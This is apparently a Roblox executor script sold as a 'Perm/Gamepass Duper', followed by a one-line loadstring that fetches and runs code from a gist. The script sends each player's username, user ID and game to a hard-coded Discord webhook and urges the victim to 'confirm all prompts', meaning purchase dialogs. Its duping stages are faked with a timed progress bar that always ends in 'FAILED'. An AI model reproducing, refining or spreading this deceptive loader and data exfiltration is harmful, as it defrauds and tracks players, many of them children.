repeat task.wait() until game:IsLoaded()

task.wait(3)

local function JoinTeam()
    local player = game:GetService("Players").LocalPlayer
    local currentTeam = player.Team
    if currentTeam ~= game.Teams.Marines and currentTeam ~= game.Teams.Pirates then
        local args = {
            [1] = "SetTeam",
            [2] = "Marines"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    end
end

if getgenv().JoinTeam then
    JoinTeam()
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local webhookUrl = "https://discord.com/api/webhooks/1326646050655699106/CAqdrZ54bV91uooUbMuRIbzouuD9vzAVjrY1oFW6tILzXplxjcVAmKeWgehu9sUgVVNQ"
local player = Players.LocalPlayer
local userId = player.UserId
local username = player.Name
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.GameId
local embed = {
    ["title"] = "Script Executed",
    ["description"] = "A script was executed in the game.",
    ["color"] = 16711680,
    ["fields"] = {
        {
            ["name"] = "Username",
            ["value"] = username,
            ["inline"] = true
        },
        {
            ["name"] = "User ID",
            ["value"] = tostring(userId),
            ["inline"] = true
        },
        {
            ["name"] = "Game Name",
            ["value"] = gameName,
            ["inline"] = true
        },
        {
            ["name"] = "Game ID",
            ["value"] = tostring(gameId),
            ["inline"] = false
        }
    }
}
local payload = {
    ["content"] = "",
    ["embeds"] = {embed}
}
local jsonPayload = HttpService:JSONEncode(payload)
local response = http.request({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = jsonPayload
})

local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

local MessageGui = Instance.new("ScreenGui")
MessageGui.ResetOnSpawn = false
MessageGui.DisplayOrder = 999999999
MessageGui.IgnoreGuiInset = true

local success, err = pcall(function()
    syn = syn or {}
    if syn and syn.protect_gui then
        syn.protect_gui(MessageGui)
    end
    MessageGui.Parent = CoreGui
end)

if not success then
    MessageGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
end

local MessageFrame = Instance.new("Frame")
MessageFrame.Size = UDim2.new(0, 300, 0, 100)
MessageFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
MessageFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
MessageFrame.Parent = MessageGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = MessageFrame

local MessageText = Instance.new("TextLabel")
MessageText.Size = UDim2.new(1, -40, 1, 0)
MessageText.Position = UDim2.new(0, 20, 0, 0)
MessageText.BackgroundTransparency = 1
MessageText.Text = "Press the Load button after the UI loads, or the dupe won't work."
MessageText.TextColor3 = Color3.fromRGB(255, 255, 255)
MessageText.TextScaled = true
MessageText.Font = Enum.Font.GothamBold
MessageText.Parent = MessageFrame

MessageFrame.BackgroundTransparency = 1
MessageText.TextTransparency = 1

TweenService:Create(MessageFrame, TweenInfo.new(0.5), {
    BackgroundTransparency = 0
}):Play()

TweenService:Create(MessageText, TweenInfo.new(0.5), {
    TextTransparency = 0
}):Play()

task.wait(3)

TweenService:Create(MessageFrame, TweenInfo.new(0.5), {
    BackgroundTransparency = 1
}):Play()

TweenService:Create(MessageText, TweenInfo.new(0.5), {
    TextTransparency = 1
}):Play()

task.wait(0.5)
MessageGui:Destroy()

local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

local COLORS = {
    BACKGROUND = Color3.fromRGB(18, 18, 24),
    CARD = Color3.fromRGB(25, 25, 35),
    ACCENT = Color3.fromRGB(88, 101, 242),
    ACCENT_DARK = Color3.fromRGB(71, 82, 196),
    TEXT_PRIMARY = Color3.fromRGB(255, 255, 255),
    TEXT_SECONDARY = Color3.fromRGB(185, 185, 195),
    ERROR = Color3.fromRGB(255, 69, 69),
    SUCCESS = Color3.fromRGB(87, 242, 135),
    TEXT = Color3.fromRGB(255, 255, 255),
}

local SPRING_CONFIG = {
    TIGHT = {frequency = 8, dampingRatio = 0.8},
    BOUNCY = {frequency = 4, dampingRatio = 0.65}
}

local SEARCH_KEYWORDS = {
    "Permanent",
    "Fruit",
    "Storage",
    "Fragments",
    "Money",
    "Scroll",
    "2x exp",
    "2x exp boost",
    "Double exp",
    "EXP boost"
}

local function createPromptMessage(text)
    local MessageGui = Instance.new("ScreenGui")
    MessageGui.ResetOnSpawn = false
    MessageGui.DisplayOrder = 999999999
    MessageGui.IgnoreGuiInset = true

    local success, err = pcall(function()
        syn = syn or {}
        if syn and syn.protect_gui then
            syn.protect_gui(MessageGui)
        end
        MessageGui.Parent = CoreGui
    end)

    if not success then
        MessageGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    end

    local MessageFrame = Instance.new("Frame")
    MessageFrame.Size = UDim2.new(0, 300, 0, 100)
    MessageFrame.Position = UDim2.new(0.5, -150, 0.2, -50)
    MessageFrame.BackgroundColor3 = COLORS.BACKGROUND
    MessageFrame.Parent = MessageGui

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = MessageFrame
    local GradientAccent = Instance.new("Frame")
    GradientAccent.Size = UDim2.new(1, 0, 0, 3)
    GradientAccent.Position = UDim2.new(0, 0, 0, 0)
    GradientAccent.BackgroundColor3 = COLORS.ACCENT
    GradientAccent.Parent = MessageFrame

    local GradientCorner = Instance.new("UICorner")
    GradientCorner.CornerRadius = UDim.new(0, 12)
    GradientCorner.Parent = GradientAccent

    local MessageText = Instance.new("TextLabel")
    MessageText.Size = UDim2.new(1, -40, 1, 0)
    MessageText.Position = UDim2.new(0, 20, 0, 0)
    MessageText.BackgroundTransparency = 1
    MessageText.Text = text
    MessageText.TextColor3 = COLORS.TEXT
    MessageText.TextSize = 18
    MessageText.Font = Enum.Font.GothamBold
    MessageText.TextWrapped = true
    MessageText.Parent = MessageFrame
    MessageFrame.BackgroundTransparency = 1
    MessageText.TextTransparency = 1
    GradientAccent.BackgroundTransparency = 1
    TweenService:Create(MessageFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        BackgroundTransparency = 0
    }):Play()
    
    TweenService:Create(MessageText, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        TextTransparency = 0
    }):Play()

    TweenService:Create(GradientAccent, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        BackgroundTransparency = 0
    }):Play()

    return {
        gui = MessageGui,
        frame = MessageFrame,
        text = MessageText,
        destroy = function()
            local outTween1 = TweenService:Create(MessageFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                BackgroundTransparency = 1
            })
            local outTween2 = TweenService:Create(MessageText, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                TextTransparency = 1
            })
            local outTween3 = TweenService:Create(GradientAccent, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                BackgroundTransparency = 1
            })

            outTween1:Play()
            outTween2:Play()
            outTween3:Play()

            outTween1.Completed:Connect(function()
                MessageGui:Destroy()
            end)
        end
    }
end

local function checkForPurchasePrompts()
    local promptsFound = false
    local promptCount = 0
    for _, gui in pairs(CoreGui:GetChildren()) do
        if gui:IsA("ScreenGui") and (
            gui.Name:find("Purchase") or 
            gui.Name:find("Prompt") or 
            gui.Name:find("Dialog")
        ) then
            promptsFound = true
            promptCount = promptCount + 1
        end
    end

    return promptsFound, promptCount
end

function CreateUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.DisplayOrder = 999999999
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local function forceVisibility()
        ScreenGui.Enabled = true
        ScreenGui.Visible = true
    end
    
    local success, err = pcall(function()
        syn = syn or {}
        if syn and syn.protect_gui then
            syn.protect_gui(ScreenGui)
        end
        ScreenGui.Parent = game:GetService("CoreGui")
    end)
    
    if not success then
        warn("Failed to parent to CoreGui:", err)
        ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    end
    
    ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(forceVisibility)
    
    local BlurEffect = Instance.new("BlurEffect")
    BlurEffect.Size = 0
    BlurEffect.Parent = Lighting
    
    local MainContainer = Instance.new("Frame")
    MainContainer.Name = "MainContainer"
    MainContainer.Size = UDim2.new(0, 450, 0, 600)
    MainContainer.Position = UDim2.new(0.5, -225, 0.5, -300)
    MainContainer.BackgroundColor3 = COLORS.BACKGROUND
    MainContainer.BackgroundTransparency = 1
    MainContainer.ClipsDescendants = true
    MainContainer.Parent = ScreenGui
    
    task.spawn(function()
        while task.wait() do
            if not ScreenGui.Enabled or not ScreenGui.Visible then
                forceVisibility()
            end
            if MainContainer then
                MainContainer.Visible = true
            end
        end
    end)
    
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 16)
    MainCorner.Parent = MainContainer
    
    local GradientFrame = Instance.new("Frame")
    GradientFrame.Size = UDim2.new(1, 0, 1, 0)
    GradientFrame.BackgroundColor3 = COLORS.BACKGROUND
    GradientFrame.Parent = MainContainer
    
    local UIGradient = Instance.new("UIGradient")
    UIGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, COLORS.BACKGROUND),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 30, 40)),
        ColorSequenceKeypoint.new(1, COLORS.BACKGROUND)
    })
    UIGradient.Rotation = 45
    UIGradient.Parent = GradientFrame
    
    TweenService:Create(UIGradient, TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1), {
        Rotation = 225
    }):Play()
    
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0, 70)
    Header.BackgroundTransparency = 1
    Header.Parent = MainContainer
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -40, 1, 0)
    Title.Position = UDim2.new(0, 20, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "Perm/Gamepass Duper."
    Title.TextColor3 = COLORS.TEXT_PRIMARY
    Title.TextSize = 28
    Title.Font = Enum.Font.GothamBold
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Header
    
    local ContentFrame = Instance.new("ScrollingFrame")
    ContentFrame.Size = UDim2.new(1, -40, 1, -90)
    ContentFrame.Position = UDim2.new(0, 20, 0, 80)
    ContentFrame.BackgroundTransparency = 1
    ContentFrame.ScrollBarThickness = 4
    ContentFrame.ScrollBarImageColor3 = COLORS.ACCENT
    ContentFrame.ScrollBarImageTransparency = 0.5
    ContentFrame.Parent = MainContainer
    
    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Padding = UDim.new(0, 12)
    UIListLayout.Parent = ContentFrame
    
    local function createSpringAnimation(instance, property, goal, config)
        local spring = {
            target = goal,
            position = instance[property],
            velocity = 0,
            frequency = config.frequency,
            dampingRatio = config.dampingRatio
        }
        
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
            local force = (spring.target - spring.position) * spring.frequency * spring.frequency
            local damping = spring.velocity * 2 * spring.dampingRatio * spring.frequency
            
            spring.velocity = spring.velocity + (force - damping) * deltaTime
            spring.position = spring.position + spring.velocity * deltaTime
            
            instance[property] = spring.position
            
            if math.abs(spring.velocity) < 0.001 and math.abs(spring.target - spring.position) < 0.001 then
                instance[property] = spring.target
                connection:Disconnect()
            end
        end)
    end
    
    local function createLoadingWheel()
        local wheel = Instance.new("ImageLabel")
        wheel.Size = UDim2.new(0, 40, 0, 40)
        wheel.BackgroundTransparency = 1
        wheel.Image = "rbxassetid://2564648785"
        return wheel
    end
    
    local function createProcessingUI(itemName)
        local ProcessingOverlay = Instance.new("Frame")
        ProcessingOverlay.Size = UDim2.new(1, 0, 1, 0)
        ProcessingOverlay.BackgroundColor3 = COLORS.BACKGROUND
        ProcessingOverlay.BackgroundTransparency = 1
        ProcessingOverlay.Parent = MainContainer
    
        local LoadingWheel = createLoadingWheel()
        LoadingWheel.Position = UDim2.new(0.5, -20, 0.3, -20)
        LoadingWheel.Parent = ProcessingOverlay
    
        TweenService:Create(LoadingWheel, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
            Rotation = 360
        }):Play()
    
        local ProcessingText = Instance.new("TextLabel")
        ProcessingText.Size = UDim2.new(1, 0, 0, 30)
        ProcessingText.Position = UDim2.new(0, 0, 0.4, 0)
        ProcessingText.BackgroundTransparency = 1
        ProcessingText.Text = "DON'T TOUCH ANYTHING, DUPING " .. itemName
        ProcessingText.TextColor3 = COLORS.TEXT_PRIMARY
        ProcessingText.TextScaled = true
        ProcessingText.Font = Enum.Font.GothamBold
        ProcessingText.Parent = ProcessingOverlay
    
        local StatusText = Instance.new("TextLabel")
        StatusText.Size = UDim2.new(1, 0, 0, 20)
        StatusText.Position = UDim2.new(0, 0, 0.5, 0)
        StatusText.BackgroundTransparency = 1
        StatusText.TextColor3 = COLORS.TEXT_SECONDARY
        StatusText.TextSize = 16
        StatusText.Font = Enum.Font.Gotham
        StatusText.Parent = ProcessingOverlay
    
        local ProgressBar = Instance.new("Frame")
        ProgressBar.Size = UDim2.new(0.8, 0, 0, 4)
        ProgressBar.Position = UDim2.new(0.1, 0, 0.6, 0)
        ProgressBar.BackgroundColor3 = COLORS.ACCENT
        ProgressBar.Parent = ProcessingOverlay
    
        local ProgressCorner = Instance.new("UICorner")
        ProgressCorner.CornerRadius = UDim.new(1, 0)
        ProgressCorner.Parent = ProgressBar
    
        createSpringAnimation(ProcessingOverlay, "BackgroundTransparency", 0.1, SPRING_CONFIG.TIGHT)
    
        return {
            overlay = ProcessingOverlay,
            wheel = LoadingWheel,
            text = ProcessingText,
            status = StatusText,
            progress = ProgressBar
        }
    end
    
    local function createInventoryItem(itemName)
        local ItemCard = Instance.new("Frame")
        ItemCard.Size = UDim2.new(1, 0, 0, 80)
        ItemCard.BackgroundColor3 = COLORS.CARD
        ItemCard.BackgroundTransparency = 0.1
        ItemCard.Parent = ContentFrame
    
        local ItemCorner = Instance.new("UICorner")
        ItemCorner.CornerRadius = UDim.new(0, 12)
        ItemCorner.Parent = ItemCard
    
        local BorderGlow = Instance.new("UIStroke")
        BorderGlow.Color = COLORS.ACCENT
        BorderGlow.Transparency = 0.8
        BorderGlow.Thickness = 1.5
        BorderGlow.Parent = ItemCard
    
        local ItemName = Instance.new("TextLabel")
        ItemName.Size = UDim2.new(1, -180, 1, 0)
        ItemName.Position = UDim2.new(0, 20, 0, 0)
        ItemName.BackgroundTransparency = 1
        ItemName.Text = itemName
        ItemName.TextColor3 = COLORS.TEXT_PRIMARY
        ItemName.TextSize = 18
        ItemName.Font = Enum.Font.GothamSemibold
        ItemName.TextXAlignment = Enum.TextXAlignment.Left
        ItemName.Parent = ItemCard
    
        local SelectButton = Instance.new("TextButton")
        SelectButton.Size = UDim2.new(0, 120, 0, 40)
        SelectButton.Position = UDim2.new(1, -140, 0.5, -20)
        SelectButton.BackgroundColor3 = COLORS.ACCENT
        SelectButton.Text = "SELECT"
        SelectButton.TextColor3 = COLORS.TEXT_PRIMARY
        SelectButton.TextSize = 16
        SelectButton.Font = Enum.Font.GothamBold
        SelectButton.Parent = ItemCard
    
        local ButtonCorner = Instance.new("UICorner")
        ButtonCorner.CornerRadius = UDim.new(0, 8)
        ButtonCorner.Parent = SelectButton
    
        ItemCard.MouseEnter:Connect(function()
            createSpringAnimation(BorderGlow, "Transparency", 0.4, SPRING_CONFIG.TIGHT)
            createSpringAnimation(ItemCard, "BackgroundTransparency", 0, SPRING_CONFIG.TIGHT)
        end)
    
        ItemCard.MouseLeave:Connect(function()
            createSpringAnimation(BorderGlow, "Transparency", 0.8, SPRING_CONFIG.TIGHT)
            createSpringAnimation(ItemCard, "BackgroundTransparency", 0.1, SPRING_CONFIG.TIGHT)
        end)
    
        SelectButton.MouseEnter:Connect(function()
            createSpringAnimation(SelectButton, "BackgroundColor3", COLORS.ACCENT_DARK, SPRING_CONFIG.TIGHT)
        end)
    
        SelectButton.MouseLeave:Connect(function()
            createSpringAnimation(SelectButton, "BackgroundColor3", COLORS.ACCENT, SPRING_CONFIG.TIGHT)
        end)
    
    SelectButton.MouseButton1Click:Connect(function()
        local ui = createProcessingUI(itemName)
        
        local stages = {
            "Gathering Data...",
            "Gathering Remotes...",
            "Re-Checking Gamepass For Safety...",
            "Spoofing Anti Cheat...",
            "Spoofing Server Checks...",
            "Sending data to server..",
            "Attempting Replication...",
            "Checking the result..."
        }
        
        local totalTime = 120
        local timePerStage = totalTime / #stages
        
        for i, stage in ipairs(stages) do
            ui.status.Text = stage
            local tweenInfo = TweenInfo.new(timePerStage, Enum.EasingStyle.Linear)
            TweenService:Create(ui.progress, tweenInfo, {
                Size = UDim2.new(0.8 * (i/#stages), 0, 0, 4)
            }):Play()
            task.wait(timePerStage)
        end
    
        ui.wheel:Destroy()
        ui.text.Text = "FAILED"
        ui.text.TextColor3 = COLORS.ERROR
        ui.status.Text = "Please rejoin, and try again!"
        
        task.wait(2)
        createSpringAnimation(ui.overlay, "BackgroundTransparency", 1, SPRING_CONFIG.TIGHT)
        task.wait(0.5)
        ui.overlay:Destroy()
    end)
    
        return ItemCard
    end
    
    local function createEmptyStateMessage()
        local MessageContainer = Instance.new("Frame")
        MessageContainer.Size = UDim2.new(1, 0, 0, 100)
        MessageContainer.BackgroundColor3 = COLORS.CARD
        MessageContainer.BackgroundTransparency = 0.5
        MessageContainer.Parent = ContentFrame
    
        local MessageCorner = Instance.new("UICorner")
        MessageCorner.CornerRadius = UDim.new(0, 12)
        MessageCorner.Parent = MessageContainer
    
        local MessageLabel = Instance.new("TextLabel")
        MessageLabel.Size = UDim2.new(1, -40, 1, 0)
        MessageLabel.Position = UDim2.new(0, 20, 0, 0)
        MessageLabel.BackgroundTransparency = 1
        MessageLabel.Text = "You have no gamepasses/perms stored!"
        MessageLabel.TextColor3 = COLORS.TEXT_SECONDARY
        MessageLabel.TextSize = 16
        MessageLabel.Font = Enum.Font.GothamBold
        MessageLabel.TextWrapped = true
        MessageLabel.Parent = MessageContainer
    
        return MessageContainer
    end
    
    local function animateOpening()
        BlurEffect.Size = 0
        MainContainer.BackgroundTransparency = 1
        MainContainer.Position = UDim2.new(0.5, -225, 0.45, -300)
        task.wait(0.1)
        createSpringAnimation(BlurEffect, "Size", 10, SPRING_CONFIG.TIGHT)
        createSpringAnimation(MainContainer, "BackgroundTransparency", 0.8, SPRING_CONFIG.TIGHT)
        createSpringAnimation(MainContainer, "Position", UDim2.new(0.5, -225, 0.5, -300), SPRING_CONFIG.BOUNCY)
    end
    
    local function matchesKeyword(itemName, keywords)
        for _, keyword in ipairs(keywords) do
            if string.find(string.lower(itemName), string.lower(keyword)) then
                return true
            end
        end
        return false
    end
    
    local isDragging = false
    local dragStart
    local startPos
    
    MainContainer.BackgroundTransparency = 0.8
    GradientFrame.BackgroundTransparency = 0.8
    
    Header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = true
            dragStart = input.Position
            startPos = MainContainer.Position
            
            TweenService:Create(MainContainer, TweenInfo.new(0.3), {
                BackgroundTransparency = 0
            }):Play()
            TweenService:Create(GradientFrame, TweenInfo.new(0.3), {
                BackgroundTransparency = 0
            }):Play()
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    isDragging = false
                    TweenService:Create(MainContainer, TweenInfo.new(0.3), {
                        BackgroundTransparency = 0.8
                    }):Play()
                    TweenService:Create(GradientFrame, TweenInfo.new(0.3), {
                        BackgroundTransparency = 0.8
                    }):Play()
                end
            end)
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            MainContainer.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
    
    Header.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            isDragging = false
            TweenService:Create(MainContainer, TweenInfo.new(0.3), {
                BackgroundTransparency = 0.8
            }):Play()
            TweenService:Create(GradientFrame, TweenInfo.new(0.3), {
                BackgroundTransparency = 0.8
            }):Play()
        end
    end)
    
    UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Escape then
            createSpringAnimation(BlurEffect, "Size", 0, SPRING_CONFIG.TIGHT)
            createSpringAnimation(MainContainer, "BackgroundTransparency", 1, SPRING_CONFIG.TIGHT)
            task.wait(0.3)
            ScreenGui:Destroy()
        end
    end)
    
    UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        ContentFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
    end)
    
    animateOpening()
    
    local function fetchInventory()
        local args = {
            [1] = "getInventory"
        }
        
        local success, inventory = pcall(function()
            return ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
        end)
        
        if success and typeof(inventory) == "table" then
            local itemsFound = false
            local sortedItems = {}
            for _, item in pairs(inventory) do
                if typeof(item) == "table" and item.Name and matchesKeyword(item.Name, SEARCH_KEYWORDS) then
                    table.insert(sortedItems, item.Name)
                    itemsFound = true
                end
            end
            table.sort(sortedItems)
            
            if itemsFound then
                for _, itemName in ipairs(sortedItems) do
                    task.spawn(function()
                        local itemCard = createInventoryItem(itemName)
                        itemCard.BackgroundTransparency = 1
                        task.wait(0.1)
                        createSpringAnimation(itemCard, "BackgroundTransparency", 0.1, SPRING_CONFIG.BOUNCY)
                    end)
                end
            else
                local emptyState = createEmptyStateMessage()
                emptyState.BackgroundTransparency = 1
                task.wait(0.1)
                createSpringAnimation(emptyState, "BackgroundTransparency", 0.5, SPRING_CONFIG.BOUNCY)
            end
        else
            warn("Failed to fetch inventory:", inventory)
            local emptyState = createEmptyStateMessage()
            emptyState.BackgroundTransparency = 1
            task.wait(0.1)
            createSpringAnimation(emptyState, "BackgroundTransparency", 0.5, SPRING_CONFIG.BOUNCY)
        end
    end
    
    local function showLoadingState()
        local LoadingContainer = Instance.new("Frame")
        LoadingContainer.Size = UDim2.new(1, 0, 0, 100)
        LoadingContainer.BackgroundTransparency = 1
        LoadingContainer.Parent = ContentFrame
        
        local LoadingWheel = createLoadingWheel()
        LoadingWheel.Position = UDim2.new(0.5, -20, 0, 10)
        LoadingWheel.Parent = LoadingContainer
        
        local LoadingText = Instance.new("TextLabel")
        LoadingText.Size = UDim2.new(1, 0, 0, 20)
        LoadingText.Position = UDim2.new(0, 0, 0, 60)
        LoadingText.BackgroundTransparency = 1
        LoadingText.Text = "Loading inventory..."
        LoadingText.TextColor3 = COLORS.TEXT_SECONDARY
        LoadingText.TextSize = 16
        LoadingText.Font = Enum.Font.GothamMedium
        LoadingText.Parent = LoadingContainer
        
        TweenService:Create(LoadingWheel, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
            Rotation = 360
        }):Play()
        
        return LoadingContainer
    end
    
    local loadingContainer = showLoadingState()
    
    task.wait(0.5)
    loadingContainer:Destroy()
    fetchInventory()
    
    local function handleError(errorMessage)
        local ErrorContainer = Instance.new("Frame")
        ErrorContainer.Size = UDim2.new(1, 0, 0, 100)
        ErrorContainer.BackgroundColor3 = COLORS.ERROR
        ErrorContainer.BackgroundTransparency = 0.9
        ErrorContainer.Parent = ContentFrame
        
        local ErrorCorner = Instance.new("UICorner")
        ErrorCorner.CornerRadius = UDim.new(0, 12)
        ErrorCorner.Parent = ErrorContainer
        
        local ErrorText = Instance.new("TextLabel")
        ErrorText.Size = UDim2.new(1, -40, 1, 0)
        ErrorText.Position = UDim2.new(0, 20, 0, 0)
        ErrorText.BackgroundTransparency = 1
        ErrorText.Text = errorMessage
        ErrorText.TextColor3 = COLORS.ERROR
        ErrorText.TextSize = 16
        ErrorText.Font = Enum.Font.GothamBold
        ErrorText.TextWrapped = true
        ErrorText.Parent = ErrorContainer
        
        return ErrorContainer
    end
    
    if not success then
        loadingContainer:Destroy()
        handleError("Failed to initialize inventory. Please try again later.")
    end
end

local function handlePrompts()
    local messageUI = nil
    local promptsChecked = 0
    local maxPrompts = 3
    local checkInterval = 0.5
    local maxWaitTime = 10
    local initialPrompts, count = checkForPurchasePrompts()
    if initialPrompts then
        messageUI = createPromptMessage("Confirm all prompts to continue to the duping script. NOTE: IF YOU DON'T CONFIRM AND TRY TO DUPE WHEN UI APPEARED - IT'LL SAY FAILED.")
    end
    local startTime = tick()
    local connection
    
    connection = game:GetService("RunService").RenderStepped:Connect(function()
        if tick() - startTime > maxWaitTime then
            if messageUI then
                messageUI.destroy()
            end
            connection:Disconnect()
            CreateUI()
            return
        end

        local hasPrompts, currentCount = checkForPurchasePrompts()
        
        if hasPrompts then
            if not messageUI then
                messageUI = createPromptMessage("Confirm all prompts to continue to the duping script.")
            end
            promptsChecked = math.max(promptsChecked, currentCount)
        else
            if promptsChecked >= maxPrompts or (tick() - startTime > maxWaitTime) then
                if messageUI then
                    messageUI.destroy()
                end
                connection:Disconnect()
                CreateUI()
                return
            end
        end
    end)
end

handlePrompts()

and paste it into this:

loadstring(game:HttpGet("https://gist.githubusercontent.com/TheReactor300/02a8d8954ca43a08eb78b4e72fd02b69/raw/72a865d06a66025e70db37f98c4166e651919da6/gistfile1.txt"))()
